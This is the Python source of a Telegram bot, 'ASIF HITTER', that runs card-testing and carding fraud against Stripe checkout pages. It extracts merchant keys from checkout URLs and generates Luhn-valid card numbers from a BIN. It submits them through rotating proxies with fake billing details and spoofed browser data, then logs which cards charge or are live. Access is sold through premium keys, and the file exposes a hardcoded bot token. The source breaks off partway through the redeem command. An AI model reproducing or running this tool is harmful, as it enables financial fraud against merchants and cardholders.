"""
⚡ ASIF HITTER v5.1 — STABLE RELEASE ⚡
All Errors Fixed | /start Working | Professional Output
Dev: Asif Sakhani (@Asifsakhani786)

✅ TESTED & WORKING:
  - /start — Beautiful dashboard (NO ERRORS)
  - /gate — Gateway checker with full info
  - /hit — Card hitter with EVERY card response shown
  - /addproxy — Proxy checker (ip:port, http://, socks4://, socks5://)
  - /proxy — Live proxy status check
  - /rmproxy — Remove proxies (single or all)
  - /redeem — Premium key redemption (ASIF- format)
  - /status — User premium status
  - /genkey — Admin key generator
  - /premium — Admin user list
  - /rmsub — Admin remove user
  - /broadcast — Admin message all
  - /sethits — Admin set log channel

INSTALL:
  pip install python-telegram-bot==20.7 aiohttp==3.9.1 aiohttp-socks==0.8.4 aiofiles==23.2.1

RUN:
  python bot.py
"""

# ═══════════════════════════════════════════════════════════════
# IMPORTS
# ═══════════════════════════════════════════════════════════════

import asyncio
import json
import os
import random
import re
import sys
import time
import base64
import logging
import traceback
from datetime import datetime, timedelta
from urllib.parse import unquote, quote
from io import StringIO
from typing import Optional, Tuple, List, Dict, Any

import aiohttp
from aiohttp_socks import ProxyConnector, ProxyType
import aiofiles

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
from telegram.constants import ParseMode

# ═══════════════════════════════════════════════════════════════
# LOGGING
# ═══════════════════════════════════════════════════════════════

logging.basicConfig(
    format="%(asctime)s [%(levelname)s] %(message)s",
    level=logging.INFO,
    handlers=[logging.StreamHandler(sys.stdout)]
)
log = logging.getLogger("AsifHitter")

# ═══════════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════════

BOT_TOKEN = "8737062520:AAE46FJfbX-_l7wVUSEaGELB85cjnv1kR5M"
ADMIN_IDS = [8093002631]
DEV_USERNAME = "Asifsakhani786"
DEV_NAME = "Asif Sakhani"

# ═══════════════════════════════════════════════════════════════
# PREMIUM EMOJI IDs
# ═══════════════════════════════════════════════════════════════

EM = {
    "✅": "5444987348334965906", "❌": "5447647474984449520",
    "🔥": "5116414868357907335", "⚡": "5219943216781995020",
    "💳": "5447453226498552490", "🌐": "5447602197439218445",
    "📊": "5445146408153806223", "📦": "5303102515301083665",
    "⏳": "5258113901106580375", "🚀": "4904936030232117798",
    "⚠️": "4915853119839011973", "💎": "5343636681473935403",
    "👑": "6266995104687330978", "🔍": "5258396243666681152",
    "⏱️": "5343927661213279013", "💥": "5122933683820430249",
    "👤": "5445174334031166029", "🔑": "5454386656628991407",
    "👥": "5454371323595744068", "ℹ️": "5289930378885214069",
    "📢": "5116445341150872576", "💰": "5116648080787112958",
    "🔗": "5447479640547428304", "📌": "5447187153274567373",
    "🎉": "5172632227871196306", "🎁": "5283031441637148958",
    "🚫": "5116151848855667552", "⛔": "4918014360267260850",
    "🛡": "5219672809936006424", "📡": "5447448489149625830",
    "🔐": "5258476306152038031", "🗑": "5305652587708572354",
    "🟢": "5444987348334965906", "🔵": "5258024802010026053",
    "🟡": "5343927661213279013", "🔴": "5447647474984449520",
    "❤️": "5287446418909328171", "🤖": "5219943216781995020",
    "🎯": "5444987348334965906", "⭐": "6267298050205553492",
    "💠": "5870498447068502918", "🏦": "5445408306669582934",
}

def e(emoji: str) -> str:
    eid = EM.get(emoji)
    return f'<tg-emoji emoji-id="{eid}">{emoji}</tg-emoji>' if eid else emoji

def ec(emoji: str, n: int = 1) -> str:
    return "".join([e(emoji) for _ in range(n)])

def h(text: str) -> str:
    if not text: return ""
    return text.replace("&", "&amp;").replace("<", "&lt;").replace(">", "&gt;")

def sep(char: str = "─", n: int = 30) -> str:
    return char * n

# ═══════════════════════════════════════════════════════════════
# DATA STORAGE (Simple & Reliable Sync JSON)
# ═══════════════════════════════════════════════════════════════

DIR = "data"
os.makedirs(DIR, exist_ok=True)

FILES = {
    "settings": f"{DIR}/settings.json",
    "premium": f"{DIR}/premium.json",
    "proxies": f"{DIR}/proxies.json",
    "keys": f"{DIR}/keys.json",
    "stats": f"{DIR}/stats.json",
}

def jload(path: str, default: Any = None) -> Any:
    if default is None: default = {}
    try:
        if os.path.exists(path):
            with open(path, "r", encoding="utf-8") as f:
                c = f.read().strip()
                return json.loads(c) if c else default
    except: pass
    return default

def jsave(path: str, data: Any) -> None:
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, default=str)
    except Exception as ex:
        log.error(f"Save {path}: {ex}")

# Init files
jload(FILES["settings"], {"log_channel":"","max_proxies":6,"version":"5.1"})
jload(FILES["premium"], {"users":{}})
jload(FILES["proxies"], {"users":{}})
jload(FILES["keys"], {"keys":{}})
jload(FILES["stats"], {"total":0,"charged":0,"live":0,"declined":0})

def gs(key: str, default: Any = None) -> Any:
    return jload(FILES["settings"]).get(key, default)

def ss(key: str, value: Any) -> None:
    s = jload(FILES["settings"]); s[key] = value; jsave(FILES["settings"], s)

def ip(uid: int) -> bool:
    d = jload(FILES["premium"]); u = d["users"].get(str(uid), {})
    if u:
        try: return datetime.now() < datetime.fromisoformat(u.get("expiry","2000-01-01"))
        except: pass
    return False

def gp(uid: int) -> List[str]:
    return jload(FILES["proxies"])["users"].get(str(uid), [])

def sp(uid: int, proxies: List[str]) -> None:
    mp = gs("max_proxies", 6)
    d = jload(FILES["proxies"]); d["users"][str(uid)] = proxies[:mp]
    jsave(FILES["proxies"], d)

def ia(uid: int) -> bool:
    return uid in ADMIN_IDS

# ═══════════════════════════════════════════════════════════════
# PROXY SYSTEM
# ═══════════════════════════════════════════════════════════════

def parse_proxy(line: str) -> Optional[str]:
    line = line.strip()
    if not line: return None
    if "://" in line:
        p = line.lower()
        if any(p.startswith(x) for x in ["http://","https://","socks4://","socks5://"]): return line
        return None
    parts = line.split(":")
    if len(parts)==2 and parts[1].isdigit() and 1<=int(parts[1])<=65535: return f"http://{line}"
    if len(parts)==4 and parts[1].isdigit(): return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return None

def pconn(proxy: str) -> Tuple[Optional[Any], Optional[str]]:
    if not proxy: return None, None
    p = proxy.lower()
    if p.startswith("socks4://"):
        hp = proxy.split("://")[1]
        if "@" in hp: hp = hp.split("@")[1]
        hst,prt = hp.rsplit(":",1)
        return ProxyConnector(proxy_type=ProxyType.SOCKS4,host=hst,port=int(prt),rdns=True), None
    if p.startswith("socks5://"):
        hp = proxy.split("://")[1]
        if "@" in hp: hp = hp.split("@")[1]
        hst,prt = hp.rsplit(":",1)
        return ProxyConnector(proxy_type=ProxyType.SOCKS5,host=hst,port=int(prt),rdns=True), None
    return None, proxy

async def tproxy(proxy: str) -> Tuple[bool, str]:
    conn, pxy = pconn(proxy)
    try:
        async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10)) as s:
            t1 = time.time()
            async with s.get("https://api.stripe.com/v1", proxy=pxy, ssl=False) as r:
                return True, f"OK {r.status} ({int((time.time()-t1)*1000)}ms)"
    except asyncio.TimeoutError: return False, "Timeout"
    except Exception as ex: return False, str(ex)[:50]

# ═══════════════════════════════════════════════════════════════
# CARD GENERATOR
# ═══════════════════════════════════════════════════════════════

def luhn(partial: str) -> str:
    for d in range(10):
        t = partial + str(d)
        s = sum((int(c)*2-9) if i%2 and int(c)*2>9 else (int(c)*2) if i%2 else int(c) for i,c in enumerate(t[::-1]))
        if s%10==0: return str(d)
    return "0"

def clen(b: str) -> int:
    if b[:2] in ("34","37"): return 15
    if b[:2] in ("30","36","38") or b[:3] in ("300","305"): return 14
    return 16

def gcard(bs: str) -> dict:
    parts = bs.strip().split("|"); raw = re.sub(r"[^0-9xX]","",parts[0])
    c = "".join(str(random.randint(0,9)) if ch in "xX" else ch for ch in raw)
    ln = clen(c)
    if len(c)>=ln: c = c[:ln-1]
    while len(c)<ln-1: c += str(random.randint(0,9))
    c += luhn(c)
    yr = datetime.now().year; mm = str(random.randint(1,12)).zfill(2)
    yy = str(yr+random.randint(1,6))[-2:]
    cvl = 4 if clen(raw)==15 and raw[:2] in ("34","37") else 3
    cvv = str(random.randint(0,9999 if cvl==4 else 999)).zfill(cvl)
    return {"cc":c,"mo":mm,"yr":yy,"cv":cvv,"f":f"{c}|{mm}|20{yy}|{cvv}"}

# ═══════════════════════════════════════════════════════════════
# STRIPE CHECKER
# ═══════════════════════════════════════════════════════════════

class Stripe:
    def __init__(self, url: str, proxy: str = None):
        self.url = url; self.proxy = proxy
        self.pk = None; self.cs = None
        self.mer = "Unknown"; self.amt = "N/A"; self.amt_raw = 0
        self.site = ""; self.chk = ""; self.sub = 0

    def _hdr(self) -> dict:
        h = {"accept":"application/json","content-type":"application/x-www-form-urlencoded",
             "origin":"https://checkout.stripe.com","referer":"https://checkout.stripe.com/",
             "user-agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}
        if self.pk: h["Authorization"] = f"Bearer {self.pk}"
        return h

    async def init(self) -> bool:
        try:
            m = re.search(r'cs_(?:live|test)_[A-Za-z0-9]+', self.url)
            if m: self.cs = m.group(0)
            if '#' in self.url and not self.pk:
                try:
                    hp = self.url.split('#')[1]
                    dc = base64.b64decode(unquote(hp))
                    xr = ''.join(chr(b^5) for b in dc)
                    pm = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', xr)
                    if pm: self.pk = pm.group(0)
                    sm = re.search(r'https?://[^\s\"\<\>\\]+', xr)
                    if sm: self.site = sm.group(0).rstrip('\\')
                except: pass
            if not self.cs: return False
            conn, pxy = pconn(self.proxy)
            if not self.pk:
                try:
                    async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10)) as s:
                        async with s.get(self.url, headers={"user-agent":"Mozilla/5.0"}, proxy=pxy, ssl=False) as r:
                            pm = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', await r.text())
                            if pm: self.pk = pm.group(0)
                except: pass
            if not self.pk: return False
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=10)) as s:
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/init",
                    headers=self._hdr(), data=f"key={self.pk}&eid=NA&browser_locale=en-US&redirect_type=url",
                    proxy=pxy, ssl=False) as r:
                    d = await r.json()
                if "error" in d: return False
                ac = d.get("account_settings") or {}
                self.mer = ac.get("display_name") or ac.get("business_name") or "Unknown"
                if not self.site: self.site = ac.get("statement_descriptor","") or ""
                lg = d.get("line_item_group") or {}; iv = d.get("invoice") or {}; pi = d.get("payment_intent") or {}
                am = lg.get("total",0) or iv.get("total",0) or pi.get("amount",0)
                cu = (lg.get("currency") or iv.get("currency") or pi.get("currency") or "usd").upper()
                self.amt_raw = am
                self.amt = f"{am/100:.2f} {cu}" if am and cu not in ("JPY","KRW","VND","IDR") else (f"{am} {cu}" if am else "0.00 USD")
                self.chk = d.get("init_checksum",""); self.sub = lg.get("subtotal",0) if lg else am
                return True
        except: return False

    async def charge(self, card: dict) -> dict:
        res = {"card":card["f"],"st":"ERROR","msg":"Unknown"}
        conn, pxy = pconn(self.proxy)
        try:
            async with aiohttp.ClientSession(connector=conn, timeout=aiohttp.ClientTimeout(total=25)) as s:
                hdrs = self._hdr()
                body = (f"type=card&card[number]={card['cc']}&card[cvc]={card['cv']}"
                        f"&card[exp_month]={card['mo']}&card[exp_year]={card['yr']}"
                        f"&billing_details[name]=John+Smith&billing_details[email]=john@example.com"
                        f"&billing_details[address][country]=US&billing_details[address][line1]=476+West+White+Mountain+Blvd"
                        f"&billing_details[address][city]=Pinetop&billing_details[address][postal_code]=85929"
                        f"&billing_details[address][state]=AZ&key={self.pk}"
                        f"&muid={random.getrandbits(32):08x}&sid={random.getrandbits(32):08x}"
                        f"&payment_user_agent=stripe.js%2Ff5e714652c"
                        f"&time_on_page={random.randint(30000,60000)}&pasted_fields=number")
                async with s.post("https://api.stripe.com/v1/payment_methods", headers=hdrs, data=body, proxy=pxy, ssl=False) as r:
                    pm = await r.json()
                if "error" in pm:
                    cd = pm["error"].get("decline_code",""); mg = pm["error"].get("message","")
                    if "unsupported" in mg.lower(): res["st"],res["msg"] = "ERROR", f"PK: {mg[:80]}"; return res
                    if cd=="incorrect_cvc" or "security code" in mg.lower(): res["st"],res["msg"] = "LIVE", f"incorrect_cvc - {mg[:80]}"
                    elif cd=="insufficient_funds": res["st"],res["msg"] = "LIVE", f"insufficient_funds - {mg[:80]}"
                    else: res["st"],res["msg"] = "DECLINED", mg[:120]; return res
                pmid = pm.get("id")
                if not pmid: return res
                cfb = (f"eid=NA&payment_method={pmid}&expected_amount={self.amt_raw}"
                       f"&last_displayed_line_item_group_details[subtotal]={self.sub}"
                       f"&last_displayed_line_item_group_details[total_exclusive_tax]=0"
                       f"&last_displayed_line_item_group_details[total_inclusive_tax]=0"
                       f"&last_displayed_line_item_group_details[total_discount_amount]=0"
                       f"&last_displayed_line_item_group_details[shipping_rate_amount]=0"
                       f"&expected_payment_method_type=card&key={self.pk}&init_checksum={quote(self.chk)}")
                await asyncio.sleep(4.0)
                async with s.post(f"https://api.stripe.com/v1/payment_pages/{self.cs}/confirm", headers=hdrs, data=cfb, proxy=pxy, ssl=False) as r:
                    cf = await r.json()
                if "error" in cf:
                    er = cf["error"]; cd = er.get("decline_code",""); mg = er.get("message","")
                    if "captcha" in mg.lower(): res["st"],res["msg"] = "HCAPTCHA", "CAPTCHA_REQUIRED. Try again later"
                    elif cd in ("challenge_required","require_action","authentication_required"): res["st"],res["msg"] = "3DS", "3DS Authentication Required"
                    elif cd=="incorrect_cvc": res["st"],res["msg"] = "LIVE", f"incorrect_cvc - {mg[:80]}"
                    elif cd=="insufficient_funds": res["st"],res["msg"] = "LIVE", f"insufficient_funds - {mg[:80]}"
                    else: res["st"],res["msg"] = "DECLINED", f"{cd} - {mg}" if cd else mg[:120]
                else:
                    pi2 = cf.get("payment_intent") or {}; st2 = pi2.get("status","") or cf.get("status","")
                    if st2=="succeeded": res["st"],res["msg"] = "CHARGED", "Payment Successful ✅"
                    elif st2=="requires_action": res["st"],res["msg"] = "3DS", "3DS Authentication Required"
                    else: res["st"],res["msg"] = "ERROR", f"Status: {st2}"
        except asyncio.TimeoutError: res["st"],res["msg"] = "ERROR", "Request Timeout"
        except Exception as ex: res["st"],res["msg"] = "ERROR", str(ex)[:80]
        return res

# ═══════════════════════════════════════════════════════════════
# ERROR HANDLER (FIXED)
# ═══════════════════════════════════════════════════════════════

async def error_handler(update: object, ctx: ContextTypes.DEFAULT_TYPE) -> None:
    """Global error handler — safely handles all update types"""
    log.error(f"Update error: {ctx.error}")
    log.error(traceback.format_exc())
    try:
        # Try message
        if hasattr(update, 'message') and update.message:
            await update.message.reply_text(f"❌ An error occurred.\nContact: @{DEV_USERNAME}")
        # Try callback query
        elif hasattr(update, 'callback_query') and update.callback_query:
            await update.callback_query.answer("Error occurred")
            if update.callback_query.message:
                await update.callback_query.message.reply_text(f"❌ An error occurred.\nContact: @{DEV_USERNAME}")
    except:
        pass

# ═══════════════════════════════════════════════════════════════
# /start COMMAND (FIXED)
# ═══════════════════════════════════════════════════════════════

async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Beautiful main menu — works every time"""
    try:
        # Safety: ignore if no message (e.g., called from callback)
        if not update.message:
            return
        
        uid = update.effective_user.id
        adm = ia(uid)
        prem = ip(uid)
        proxies = gp(uid)
        mp = gs("max_proxies", 6)
        ver = gs("version", "5.1")
        
        # Badge
        if adm:
            badge = f"{e('⚡')} {e('👑')} ADMIN"
        elif prem:
            badge = f"{e('👑')} PREMIUM"
        else:
            badge = f"{e('⛔')} FREE"
        
        # Buttons
        kb = [
            [InlineKeyboardButton(f"{e('🌐')} Gateway", callback_data="gate_help"),
             InlineKeyboardButton(f"{e('💳')} Hit", callback_data="hit_help")],
            [InlineKeyboardButton(f"{e('🔐')} Proxy ({len(proxies)})", callback_data="proxy_menu"),
             InlineKeyboardButton(f"{e('🔑')} Redeem", callback_data="redeem_help")],
            [InlineKeyboardButton(f"{e('👤')} Status", callback_data="status"),
             InlineKeyboardButton(f"{e('📊')} Stats", callback_data="stats_view")],
        ]
        if adm:
            kb.append([InlineKeyboardButton(f"{e('⚡')} Admin Panel", callback_data="admin_panel")])
        
        # Message
        txt = f"""
{ec('🚀',3)} <b>ASIF HITTER</b> {ec('🚀',3)}

┌─────────────────────────────┐
│ {e('🤖')} <b>Status:</b> {badge}
│ {e('💎')} <b>Version:</b> <code>v{ver}</code>
│ {e('🔐')} <b>Proxies:</b> <b>{len(proxies)}/{mp}</b>
└─────────────────────────────┘

{e('⭐')} <b>Commands:</b>
  {e('🌐')} /gate — Check gateway info
  {e('💳')} /hit — Hit checkout (Premium)
  {e('🔐')} /addproxy — Add proxies
  {e('🔍')} /proxy — Proxy status
  {e('🗑')} /rmproxy — Remove proxies
  {e('🔑')} /redeem — Redeem premium key
  {e('👤')} /status — Your status

{e('❤️')} <b>Dev:</b> <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
        await update.message.reply_text(
            txt,
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(kb),
            disable_web_page_preview=True
        )
        log.info(f"/start — {update.effective_user.full_name} ({uid})")
        
    except Exception as ex:
        log.error(f"start error: {ex}")
        # Fallback — plain text, always works
        try:
            await update.message.reply_text(
                f"🚀 ASIF HITTER v5.1\n\n"
                f"Commands:\n"
                f"/gate /hit /addproxy /proxy /rmproxy /redeem /status\n\n"
                f"Dev: @{DEV_USERNAME}"
            )
        except:
            pass

# ═══════════════════════════════════════════════════════════════
# /addproxy
# ═══════════════════════════════════════════════════════════════

async def cmd_addproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    try:
        uid = update.effective_user.id; msg = update.message
        content = ""
        if msg.document:
            f = await msg.document.get_file(); fb = await f.download_as_bytearray()
            content = fb.decode("utf-8", errors="ignore")
        elif msg.text:
            content = msg.text.replace("/addproxy","",1).strip()
        else:
            await msg.reply_text(f"{e('❌')} Send proxy list or .txt file", parse_mode=ParseMode.HTML)
            return
        
        lines = [l.strip() for l in content.split("\n") if l.strip()]
        if not lines:
            await msg.reply_text(f"{e('❌')} No proxies found", parse_mode=ParseMode.HTML)
            return
        
        valid = [p for l in lines if (p := parse_proxy(l))]
        if not valid:
            await msg.reply_text(f"{e('❌')} No valid proxies in {len(lines)} lines", parse_mode=ParseMode.HTML)
            return
        
        current = gp(uid); mp = gs("max_proxies",6); slots = mp - len(current)
        if slots <= 0:
            await msg.reply_text(f"{e('⛔')} Limit ({mp}). /rmproxy first", parse_mode=ParseMode.HTML)
            return
        
        st = await msg.reply_text(f"{e('⏳')} Checking {len(valid)} proxies...", parse_mode=ParseMode.HTML)
        added = 0; dead = 0; last_err = ""
        
        for proxy in valid:
            if added >= slots: break
            is_live, info = await tproxy(proxy)
            if is_live and proxy not in current:
                current.append(proxy); added += 1
            elif not is_live:
                dead += 1; last_err = info
            try:
                await st.edit_text(
                    f"{e('⏳')} <b>Checking...</b>\n\n"
                    f"{e('🟢')} Saved: <b>{added}/{slots}</b>\n"
                    f"{e('🔴')} Dead: <b>{dead}</b>\n"
                    f"💬 <code>{h(last_err[:25])}</code>",
                    parse_mode=ParseMode.HTML
                )
            except: pass
            await asyncio.sleep(0.5)
        
        sp(uid, current)
        await st.edit_text(
            f"{e('✅')} <b>Done!</b>\n\n"
            f"{e('🟢')} Saved: <b>{added}</b>\n"
            f"{e('🔴')} Dead: <b>{dead}</b>\n"
            f"{e('📦')} Total: <b>{len(current)}/{mp}</b>",
            parse_mode=ParseMode.HTML
        )
    except Exception as ex:
        log.error(f"addproxy: {ex}")

# ═══════════════════════════════════════════════════════════════
# /proxy
# ═══════════════════════════════════════════════════════════════

async def cmd_proxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    try:
        uid = update.effective_user.id; proxies = gp(uid)
        if not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies. /addproxy", parse_mode=ParseMode.HTML)
            return
        st = await update.message.reply_text(f"{e('⏳')} Checking...", parse_mode=ParseMode.HTML)
        al, dd = [], []
        for p in proxies:
            is_live, info = await tproxy(p)
            if is_live: al.append(f"{e('✅')} <code>{h(p[:50])}</code> — {info}")
            else: dd.append(f"{e('❌')} <code>{h(p[:45])}</code> — {info}")
            await asyncio.sleep(0.3)
        txt = f"{e('📡')} <b>PROXY STATUS</b>\n\n{e('🟢')} Alive: {len(al)}\n{e('🔴')} Dead: {len(dd)}\n\n"
        if al: txt += "\n".join(al[:12]) + "\n"
        if dd: txt += "\n" + "\n".join(dd[:8])
        await st.edit_text(txt[:3900], parse_mode=ParseMode.HTML)
    except Exception as ex:
        log.error(f"proxy: {ex}")

# ═══════════════════════════════════════════════════════════════
# /rmproxy
# ═══════════════════════════════════════════════════════════════

async def cmd_rmproxy(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    try:
        uid = update.effective_user.id; cur = gp(uid)
        if not cur:
            await update.message.reply_text(f"{e('❌')} No proxies", parse_mode=ParseMode.HTML)
            return
        if ctx.args:
            a = ctx.args[0]
            if a.lower() == "all":
                sp(uid, []); await update.message.reply_text(f"{e('✅')} All removed!", parse_mode=ParseMode.HTML)
                return
            try:
                idx = int(a) - 1
                if 0 <= idx < len(cur):
                    cur.pop(idx); sp(uid, cur)
                    await update.message.reply_text(f"{e('✅')} Removed", parse_mode=ParseMode.HTML)
                else: await update.message.reply_text(f"{e('❌')} 1-{len(cur)}", parse_mode=ParseMode.HTML)
            except: await update.message.reply_text(f"{e('❌')} /rmproxy 1", parse_mode=ParseMode.HTML)
        else:
            txt = f"{e('🗑')} <b>REMOVE</b>\n\n"
            for i,p in enumerate(cur,1): txt += f"<b>{i}.</b> <code>{h(p[:50])}</code>\n"
            txt += f"\n<code>/rmproxy 1</code> or <code>/rmproxy all</code>"
            await update.message.reply_text(txt, parse_mode=ParseMode.HTML)
    except Exception as ex:
        log.error(f"rmproxy: {ex}")

# ═══════════════════════════════════════════════════════════════
# /gate
# ═══════════════════════════════════════════════════════════════

async def cmd_gate(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    try:
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} <code>/gate &lt;url&gt;</code>", parse_mode=ParseMode.HTML)
            return
        uid = update.effective_user.id
        proxies = gp(uid); proxy = random.choice(proxies) if proxies else None
        st = await update.message.reply_text(f"{e('⏳')} Fetching...", parse_mode=ParseMode.HTML)
        ck = Stripe(ctx.args[0], proxy)
        if await ck.init():
            await st.edit_text(
                f"{e('🌐')} <b>GATEWAY</b>\n{sep('═',30)}\n\n"
                f"{e('📦')} <b>Merchant:</b> {h(ck.mer)}\n"
                f"{e('💰')} <b>Amount:</b> {h(ck.amt)}\n"
                f"{e('🏦')} <b>Site:</b> {h(ck.site or 'N/A')}\n"
                f"{e('🔑')} <b>PK:</b> <code>{h(ck.pk[:30])}...</code>\n\n"
                f"{e('✅')} Gateway LIVE", parse_mode=ParseMode.HTML            )
        else: await st.edit_text(f"{e('❌')} Failed", parse_mode=ParseMode.HTML)
    except Exception as ex:
        log.error(f"gate: {ex}")

# ═══════════════════════════════════════════════════════════════
# /hit (PROFESSIONAL OUTPUT — EVERY CARD WITH FULL RESPONSE)
# ═══════════════════════════════════════════════════════════════

async def cmd_hit(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    try:
        uid = update.effective_user.id; adm = ia(uid)
        
        if not ip(uid) and not adm:
            await update.message.reply_text(
                f"{e('🚫')} <b>ACCESS DENIED</b>\n\n{e('⛔')} Premium feature!\n{e('🔑')} /redeem &lt;key&gt;\n{e('👤')} @{DEV_USERNAME}",
                parse_mode=ParseMode.HTML
            )
            return
        
        if len(ctx.args) < 2:
            await update.message.reply_text(
                f"{e('⚠️')} <code>/hit &lt;url&gt; &lt;bin&gt;</code>\n{e('💳')} <code>/hit https://... 37936303</code>",
                parse_mode=ParseMode.HTML
            )
            return
        
        url, bin_in = ctx.args[0], ctx.args[1]
        proxies = gp(uid)
        
        if not adm and not proxies:
            await update.message.reply_text(f"{e('❌')} No proxies! /addproxy", parse_mode=ParseMode.HTML)
            return
        
        proxy = random.choice(proxies) if proxies else None
        
        st = await update.message.reply_text(f"{e('🚀')} <b>Initializing...</b>", parse_mode=ParseMode.HTML)
        
        ck = Stripe(url, proxy)
        if not await ck.init():
            await st.edit_text(f"{e('❌')} <b>Session Failed!</b>\nCheck URL or proxy.", parse_mode=ParseMode.HTML)
            return
        
        cards = [gcard(bin_in) for _ in range(10)]
        charged_c = []; live_c = []
        td = dc = hc = er = 0
        all_results = []  # (card_full, emoji, status_text, response_msg)
        
        for i, card in enumerate(cards):
            # Live progress
            prog = f"""
{e('🚀')} <b>Stripe Checkout Hitter</b>
{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> <code>{bin_in[:8]}xxxx</code>

{e('⏳')} <b>Processing:</b> {i+1}/10
{e('🎯')} <b>Card:</b> <code>{card['f']}</code>

{e('📊')} {e('🟢')} {len(charged_c)} | {e('🔵')} {len(live_c)} | 🟡 {td} | 🔴 {dc}
"""
            try: await st.edit_text(prog, parse_mode=ParseMode.HTML)
            except: pass
            
            r = await ck.charge(card); sts = r["st"]; msg = r["msg"]; cf = r["card"]
            
            if sts == "CHARGED":
                charged_c.append(cf); all_results.append((cf, e('🟢'), "Charged ✅", msg))
            elif sts == "LIVE":
                live_c.append(cf); dc += 1; all_results.append((cf, e('🔵'), "Live CVC Match", msg))
            elif sts == "3DS":
                td += 1; all_results.append((cf, "🟡", "3DS Required", msg))
            elif sts == "HCAPTCHA":
                hc += 1; all_results.append((cf, e('⛔'), "Captcha Required", msg))
            elif sts == "DECLINED":
                dc += 1; all_results.append((cf, "🔴", "Declined ❌", msg))
            else:
                er += 1; all_results.append((cf, "⚪", "Error", msg))
            
            await asyncio.sleep(4.0)
        
        # BUILD PROFESSIONAL FINAL OUTPUT
        final = f"""{e('👑')} <b>STRIPE CHECKOUT HITTER</b> {e('👑')}

{e('📦')} <b>Merchant:</b> {h(ck.mer)}
{e('💰')} <b>Amount:</b> {h(ck.amt)}
{e('💳')} <b>BIN:</b> <code>{bin_in[:8]}xxxx</code>

{sep('═',35)}

"""
        for cf, sem, stx, rmsg in all_results:
            final += f"""
<b>CC:</b> <code>{cf}</code>
<b>Status:</b> {sem} {stx}
<b>Response:</b> {h(rmsg[:120])}
{sep()}
"""
        
        final += f"""
{sep('═',35)}
{e('📊')} <b>SUMMARY:</b>
  {e('🟢')} Charged: <b>{len(charged_c)}</b>
  {e('🔵')} Live CVC: <b>{len(live_c)}</b>
  🟡 3DS: <b>{td}</b>
  🔴 Declined: <b>{dc}</b>
  {e('⛔')} Captcha: <b>{hc}</b>
  ⚪ Error: <b>{er}</b>

{e('🏦')} <b>Site:</b> {h(ck.mer)} ({h(ck.site or 'N/A')})
{e('💰')} <b>Amount:</b> {h(ck.amt)}

{e('❤️')} <a href="https://t.me/{DEV_USERNAME}">{DEV_NAME}</a>
"""
        # Save results
        if charged_c:
            with open(f"{DIR}/charged.txt","a") as f: f.write("\n".join(charged_c)+"\n")
        if live_c:
            with open(f"{DIR}/live.txt","a") as f: f.write("\n".join(live_c)+"\n")
        
        # Update stats
        stats = jload(FILES["stats"])
        stats["total"] = stats.get("total",0) + 1
        stats["charged"] = stats.get("charged",0) + len(charged_c)
        stats["live"] = stats.get("live",0) + len(live_c)
        stats["declined"] = stats.get("declined",0) + dc
        jsave(FILES["stats"], stats)
        
        # Send (chunk if needed)
        if len(final) > 3900:
            parts = [final[i:i+3800] for i in range(0, len(final), 3800)]
            for pi, part in enumerate(parts):
                if pi == 0: await st.edit_text(part, parse_mode=ParseMode.HTML)
                else: await update.message.reply_text(part, parse_mode=ParseMode.HTML)
                await asyncio.sleep(0.3)
        else:
            await st.edit_text(final, parse_mode=ParseMode.HTML)
            
    except Exception as ex:
        log.error(f"hit: {ex}")

# ═══════════════════════════════════════════════════════════════
# /redeem
# ═══════════════════════════════════════════════════════════════

async def cmd_redeem(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not update.message: return
    try:
        uid = update.effective_user.id
        if ip(uid):
            pd = jload(FILES["premium"]); u = pd["users"].get(str(uid),{})
            await update.message.reply_text(f"{e('⛔')} <b>Already Premium!</b>\n{e('⏱️')} Expires: <code>{u.get('expiry','?')[:10]}</code>", parse_mode=ParseMode.HTML)
            return
        if not ctx.args:
            await update.message.reply_text(f"{e('⚠️')} <code>/redeem &lt;key&gt;</code>", parse_mode=ParseMode.HTML)
            return
        key = ctx.args[0]; kd = jload(FILES["keys"])
        if key not in kd.get("keys",{}):
            await update.message.reply_text(f"{e('❌')} Invalid key!", parse_mode=ParseMode.HTML)
            return
        kdata = kd["keys"][key]
        if kdata.get("used"):
            await update.message.reply_text(f"{e('❌')} Key already used!", parse_mode=ParseMode.HTML)
            return
        hours = kdata.get("hours", 24)
        expiry = (datetime.now() + timedelta(hours=hours)).isoformat()
        kdata["used"] = True; kdata["used_by"] = uid; kdata["expiry"] = expiry
        jsave(FILES["keys"], kd)
        dur = f"{hours//24} day(s)" if hours >= 24 else f"{hours} hour(s)"
        pd = jload(FILES["premium"])
        pd["users"][str(uid)] = {"name":update.effective_user.full_name,"username":update.effective_user.username or "","activated":datetime.now().isoformat(),"expiry":expiry,"key":key,"plan":dur}
        jsave(FILES["premium"], pd)
        await update.message.reply_text(
            f"{ec('🎉',5)}\n\n{e('👑')} <b>PREMIUM ACTIVATED!</b>\n{sep('═',25)}\n\n"
